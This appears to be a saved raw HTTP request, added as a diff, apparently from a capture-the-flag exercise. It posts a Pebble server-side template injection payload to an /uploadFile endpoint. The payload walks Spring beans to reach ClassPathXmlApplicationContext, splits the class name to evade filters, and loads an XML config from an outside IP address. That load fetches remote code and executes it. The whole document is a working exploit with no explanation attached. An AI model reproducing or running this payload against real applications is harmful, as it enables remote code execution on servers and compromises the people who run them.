@@ -1,0 +1,27 @@
+POST /uploadFile HTTP/1.1
+User-Agent: PostmanRuntime/7.36.0
+Accept: */*
+Postman-Token: a8c4d77b-34bb-43f0-b608-2ea394a4ab2d
+Host: eci-2zeiuc2hk7njk3porwpc.cloudeci1.ichunqiu.com:8088
+Accept-Encoding: gzip, deflate
+Connection: close
+Content-Type: multipart/form-data; boundary=--------------------------863943204749606110104151
+Content-Length: 784
+
+----------------------------863943204749606110104151
+Content-Disposition: form-data; name="content"
+
+aaaaaa
+{% set y= beans.get("org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory").resourceLoader.classLoader.loadClass("java.beans.Beans") %}
+{% set yy =  beans.get("jacksonObjectMapper").readValue("{}", y) %}
+{% set yyy = yy.instantiate(null,"org.springframework.context.support.ClassPathXmlAppli"+"cationC"+"ontext") %}
+{{ yyy.setConfigLocation("http://132.232.82.54:8889/1.xml") }}
+{{ yyy.refresh() }}
+
+----------------------------863943204749606110104151
+Content-Disposition: form-data; name="file"; filename="file_20231217_115016.pebble"
+Content-Type: application/octet-stream
+
+aa
+
+----------------------------863943204749606110104151--
